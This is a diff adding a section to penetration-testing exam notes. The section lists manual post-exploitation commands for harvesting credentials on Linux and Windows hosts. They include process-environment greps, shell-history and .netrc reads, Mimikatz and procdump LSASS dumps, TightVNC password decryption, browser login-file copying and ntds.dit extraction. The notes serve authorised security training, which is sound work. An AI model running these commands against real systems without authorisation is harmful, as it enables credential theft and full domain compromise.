@@ -309,6 +309,176 @@ powershell -ep bypass -File .\lootr.ps1 -OutDir C:\Windows\Temp\loot -KaliIp <ka
 > Linux: `summary.txt`, `shadow_hashes.txt`, SSH keys, `sudo_rights.txt`, `capabilities.txt`, `internal_listeners.txt`.
 > Windows: `summary.txt`, `always_install_elevated.txt`, `privileges.txt`, `autologon.txt`, `cmdkey.txt`, `wifi_passwords.txt`, `unquoted_service_paths.txt`.
 
+---
+
+## What lootr Won't Find — Manual Loot Collection
+
+> [!important] lootr.sh / lootr.ps1 collect the common high-value items. These are the gaps — things that require context, judgment, or access to specific locations the script doesn't check.
+
+---
+
+### Linux — Manual Checks After lootr.sh
+
+**Processes and memory:**
+```bash
+# Credentials in running process environment variables
+cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|pwd|key|token|secret|api'
+
+# Process command-line args (may show -p password or --token= flags)
+ps aux | grep -iE 'pass|user|token|secret|credential'
+cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -iE 'pass|user|token'
+
+# Check if a service is running as a privileged user with interesting args
+ps -ef | grep -v '\[' | awk '{print $1,$8,$9,$10,$11}' | sort -u
+```
+
+**Non-standard file locations:**
+```bash
+# Find recently modified files (in last 7 days)
+find / -newer /etc/passwd -type f 2>/dev/null | grep -v proc | grep -v sys | head -30
+
+# Find files with "password" in the name
+find / -iname "*password*" -o -iname "*passwd*" -o -iname "*secret*" -o -iname "*cred*" \
+  2>/dev/null | grep -v proc | grep -v sys
+
+# Non-standard config locations
+find /opt /srv /data /backup /home /var/backups -type f 2>/dev/null | \
+  xargs grep -liE 'password|passwd|secret' 2>/dev/null | head -10
+
+# Database config files
+find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | grep -v proc
+# If you find a .db file: sqlite3 database.db .tables && sqlite3 database.db "SELECT * FROM users;"
+
+# SSH config with key path hints
+cat ~/.ssh/config 2>/dev/null
+cat /etc/ssh/ssh_config | grep IdentityFile
+```
+
+**Mail and user files:**
+```bash
+# Check local mail (sometimes contains passwords or internal comms)
+cat /var/mail/* 2>/dev/null | head -50
+ls /var/spool/mail/ 2>/dev/null
+cat /home/*/.forward 2>/dev/null
+
+# .netrc files (contain FTP/HTTP credentials in plaintext)
+find /home /root -name ".netrc" -readable 2>/dev/null | xargs cat
+
+# Bash/zsh history of all accessible users
+find /home /root -name ".*history" -readable 2>/dev/null | xargs cat
+cat /root/.bash_history 2>/dev/null
+
+# sudo command history (sometimes reveals passwords used with sudo)
+cat ~/.sudo_as_admin_successful 2>/dev/null
+```
+
+**Network — internal services you can't see from Kali:**
+```bash
+# Full listener list including localhost-only services
+ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
+ss -ulnp 2>/dev/null    # UDP listeners too
+
+# NFS shares (may be mountable without creds)
+showmount -e localhost 2>/dev/null
+
+# Check /etc/fstab for auto-mounts (may reveal internal share paths + creds)
+cat /etc/fstab | grep -v '^#'
+
+# Internal routing (find networks this host routes to)
+ip route show
+cat /proc/net/fib_trie | grep "LOCAL\|HOST" | awk '{print $2}' | sort -u
+```
+
+---
+
+### Windows — Manual Checks After lootr.ps1
+
+**In-memory credentials (requires SYSTEM or SeDebugPrivilege):**
+```powershell
+# Mimikatz — dump LSASS (run as SYSTEM or admin)
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# If AV blocks mimikatz, try:
+# - Dumping lsass.exe process directly:
+tasklist | findstr lsass
+procdump.exe -accepteula -ma <lsass_pid> C:\Temp\lsass.dmp
+# Transfer dump to Kali → impacket-secretsdump -sam sam.hive LOCAL
+# Or use pypykatz: pypykatz lsa minidump lsass.dmp
+
+# WDigest — if enabled, plaintext passwords cached in memory
+reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+# If value = 1 or key missing → WDigest is enabled → Mimikatz sekurlsa::wdigest
+```
+
+**Credential storage locations lootr may not reach:**
+```powershell
+# Windows Vault / Credential Manager (full list)
+vaultcmd /list
+vaultcmd /listcreds:"Windows Credentials" /all
+# Includes: saved RDP passwords, network share credentials, web credentials
+
+# IIS application pool passwords
+Get-WebConfiguration system.applicationHost/applicationPools/add -recurse | \
+  Select-Object name,userName,password | Format-List
+
+# Service account passwords (sometimes stored plaintext in service configs)
+sc qc <servicename>
+Get-WmiObject Win32_Service | Select-Object Name, StartName, PathName | Format-List
+
+# IIS web.config — sometimes contains DB connection strings with passwords
+Get-ChildItem -Path C:\inetpub -Recurse -Filter "web.config" 2>$null | \
+  Select-String -Pattern "password|connectionString" 2>$null
+
+# PowerShell SecureString that might be crackable
+# If you find: ConvertFrom-SecureString ... in a script
+# The encrypted value uses DPAPI — decrypt with the user's context
+# [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securestring))
+```
+
+**Registry and configuration files:**
+```powershell
+# Unattend.xml / sysprep.inf — installation files sometimes left with admin passwords
+Get-ChildItem -Path C:\ -Recurse -Include unattend.xml,sysprep.inf,sysprep.xml 2>$null | \
+  Select-String -Pattern "Password" 2>$null
+
+# Common paths
+type C:\Windows\Panther\unattend.xml 2>$null | findstr /i password
+type C:\Windows\System32\sysprep\sysprep.inf 2>$null
+
+# TightVNC / RealVNC password (stored in registry, DES-encrypted)
+reg query HKCU\Software\TightVNC\Server /v Password 2>$null
+reg query HKLM\Software\TightVNC\Server /v Password 2>$null
+# Decrypt with: echo -n 'HEX' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt \
+#   -K e84ad660c4721ae0 -iv 0000000000000000 -d | cat
+
+# PuTTY saved sessions (may have proxy passwords)
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s 2>$null | findstr /i "hostname\|password"
+```
+
+**Browser credentials (offline extraction):**
+```powershell
+# Chrome: copy the Login Data file and decrypt on Kali
+copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" C:\Temp\chrome_logins
+# Transfer to Kali: python3 chrome_decrypt.py or use pypykatz
+
+# Firefox: copy profile directory
+$profile = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory | Select-Object -First 1
+copy "$($profile.FullName)\logins.json" C:\Temp\ff_logins.json
+copy "$($profile.FullName)\key4.db" C:\Temp\ff_key4.db
+# Decrypt on Kali: python3 firefox_decrypt.py /path/to/profile/
+```
+
+**Active Directory replication data (from DCs):**
+```powershell
+# If you're on a DC as SYSTEM — dump ntds.dit directly
+vssadmin create shadow /for=C: 2>&1 | findstr "shadow copy volume"
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\ntds\ntds.dit C:\Temp\
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\
+# Transfer to Kali → impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+---
+
 ## Related
 
 - [[OffSec_Exam_Methodology_Complete]]
